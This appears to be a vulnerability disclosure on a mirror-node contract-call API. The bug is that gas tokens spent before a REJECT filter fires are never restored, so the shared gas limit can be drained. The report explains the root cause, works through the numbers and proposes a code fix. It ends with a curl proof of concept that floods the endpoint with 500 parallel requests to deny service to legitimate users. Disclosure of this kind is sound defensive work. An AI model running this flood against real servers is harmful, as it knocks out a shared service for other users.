### Title
Gas Token Drain via REJECT Filter: Unrestored `gasLimitBucket` Tokens on `ThrottleException`

### Summary
In `ThrottleManagerImpl.throttle()`, gas tokens are consumed from `gasLimitBucket` before request filters are evaluated. When a REJECT-action filter matches and throws `ThrottleException`, those tokens are never restored because `ContractController.call()` only restores gas on `InvalidParametersException`, not on `ThrottleException`. An unprivileged attacker who discovers a REJECT filter pattern can repeatedly send matching high-gas requests to drain the shared `gasLimitBucket`, starving legitimate users of gas capacity and causing their requests to fail with "Gas per second rate limit exceeded."

### Finding Description

**Exact code path:**

`ThrottleManagerImpl.throttle()` (lines 37–49):
```
gasLimitBucket.tryConsume(scaleGas(request.getGas()))  // tokens consumed — line 40
...
for (var requestFilter : throttleProperties.getRequest()) {
    if (requestFilter.test(request)) {
        action(requestFilter, request);  // REJECT throws ThrottleException — line 69
    }
}
```

`ContractController.call()` (lines 38–51):
```java
try {
    throttleManager.throttle(request);   // ThrottleException escapes here
    ...
} catch (InvalidParametersException e) {
    throttleManager.restore(request.getGas());  // only restores for InvalidParametersException
    throw e;
}
```

**Root cause:** Gas tokens are consumed at line 40 of `ThrottleManagerImpl` unconditionally before the filter loop. The `action()` method at line 69 throws `ThrottleException` for REJECT filters. This exception propagates out of `throttle()` and out of the `try` block in `ContractController.call()`, bypassing the only `restore()` call, which is guarded by `catch (InvalidParametersException e)`. `ThrottleException` is never caught there, so `restore()` is never invoked.

**Failed assumption:** The code assumes that gas tokens only need to be restored when `InvalidParametersException` is thrown (post-throttle validation failure). It does not account for the case where `throttle()` itself throws after consuming gas — specifically when a REJECT filter fires.

**Exploit flow:**
1. Attacker probes `POST /api/v1/contracts/call` with varying `to`, `from`, `data`, or `block` field values.
2. Requests returning HTTP 429 with body `"Invalid request"` (distinct from `"Requests per second rate limit exceeded"`) identify a matching REJECT filter pattern.
3. Attacker sends requests at the `requestsPerSecond` rate (default 500/s) with the maximum allowed `gas` value, each matching the REJECT filter.
4. Each request: `rateLimitBucket` consumes 1 token (passes), `gasLimitBucket` consumes `scaleGas(gas)` tokens (passes), REJECT filter fires → `ThrottleException` thrown → gas tokens NOT restored.
5. `gasLimitBucket` drains to zero. Subsequent legitimate requests fail at line 40–42 with "Gas per second rate limit exceeded."

**Numerical illustration:**
- Default `gasPerSecond` = 7,500,000,000 → scaled capacity = 750,000 tokens
- Default `requestsPerSecond` = 500; max gas per request (e.g., 15,000,000) → 1,500 scaled tokens each
- Attacker drain rate: 500 × 1,500 = 750,000 tokens/sec = full bucket per second
- Bucket refills greedily at 750,000 tokens/sec, but attacker matches the refill rate exactly, keeping the bucket perpetually empty for legitimate users.

### Impact Explanation
The `gasLimitBucket` is a shared, server-wide resource. Draining it prevents all legitimate `POST /api/v1/contracts/call` requests from executing EVM calls, causing those calls to return errors instead of results. In mirror-node terms, this means legitimate eth_call / eth_estimateGas queries are rejected, producing missing or incomplete records for users relying on the mirror node API. The attack is a targeted denial-of-service against gas-consuming operations with no collateral requirement on the attacker's side — rejected requests cost the attacker nothing beyond network bandwidth.

### Likelihood Explanation
No privileged access is required. Any external user can send HTTP POST requests to the public `/api/v1/contracts/call` endpoint. REJECT filter patterns are discoverable by probing (the distinct "Invalid request" error message differentiates REJECT from other throttle responses). The attack is fully repeatable and automatable with a simple HTTP client loop. The only friction is the `requestsPerSecond` rate limit, which the attacker can saturate legitimately. The attack is sustainable indefinitely as long as the attacker keeps sending requests.

### Recommendation

1. **Restore gas on all ThrottleException paths that consumed gas.** In `ThrottleManagerImpl.throttle()`, restructure so that gas is consumed only after all filter checks pass, or catch the filter-loop exception and call `restore()` before re-throwing:

```java
public void throttle(ContractCallRequest request) {
    if (!rateLimitBucket.tryConsume(1)) {
        throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
    }
    // Evaluate filters BEFORE consuming gas
    for (var requestFilter : throttleProperties.getRequest()) {
        if (requestFilter.test(request)) {
            action(requestFilter, request); // REJECT throws here — no gas consumed yet
        }
    }
    if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
        throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
    }
}
```

2. **Alternatively**, in `ContractController.call()`, also catch `ThrottleException` thrown after gas was consumed and call `restore()`. However, this is harder to implement correctly because not all `ThrottleException` paths consume gas (e.g., the `rateLimitBucket` path at line 38–39 does not).

3. **Preferred fix:** Move gas consumption to after all filter evaluations (option 1), which is the cleanest and eliminates the ambiguity entirely.

### Proof of Concept

**Precondition:** Server has at least one REJECT filter configured, e.g., blocking requests where `to` equals `0x000000000000000000000000000000000000dead`.

**Steps:**

```bash
# Step 1: Discover the REJECT pattern (probe until "Invalid request" is returned)
curl -s -X POST http://mirror-node/api/v1/contracts/call \
  -H "Content-Type: application/json" \
  -d '{"to":"0x000000000000000000000000000000000000dead","gas":15000000}'
# Response: {"_status":{"messages":[{"message":"Invalid request"}]}}

# Step 2: Drain the gasLimitBucket (run at 500 req/s)
for i in $(seq 1 500); do
  curl -s -X POST http://mirror-node/api/v1/contracts/call \
    -H "Content-Type: application/json" \
    -d '{"to":"0x000000000000000000000000000000000000dead","gas":15000000}' &
done
wait

# Step 3: Legitimate user request now fails
curl -s -X POST http://mirror-node/api/v1/contracts/call \
  -H "Content-Type: application/json" \
  -d '{"to":"0xSomeLegitimateContract","gas":100000}'
# Response: {"_status":{"messages":[{"message":"Gas per second rate limit exceeded."}]}}
```

The legitimate user's request is rejected without any EVM execution, producing a missing record. The attacker repeats Step 2 each second to keep the bucket drained indefinitely.
